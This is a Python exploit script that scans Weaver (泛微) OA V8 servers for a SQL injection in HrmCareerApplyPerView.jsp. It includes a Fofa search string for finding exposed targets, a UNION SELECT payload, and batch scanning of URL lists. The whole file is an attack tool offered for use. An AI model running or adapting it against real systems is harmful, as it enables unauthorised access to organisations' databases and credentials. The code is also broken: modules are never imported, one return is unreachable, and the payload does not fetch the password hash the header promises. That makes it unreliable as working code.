# -*- coding: utf-8 -*-
# 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值
# Fofa:  app="泛微-协同办公OA"

import sys
import requests
import urllib3
import time

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            return now_time() + " [SUCCESS]  存在HrmCareerApplyPerView的sql注入漏洞{}".format(target_url)
            return now_time() + " [WARNING]  不存在HrmCareerApplyPerView的sql注入漏洞"
    except:
        return now_time() + " [ERROR]    目标请求失败 "


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            raise ValueError("ERROR")
    except ValueError as e:
        print(e)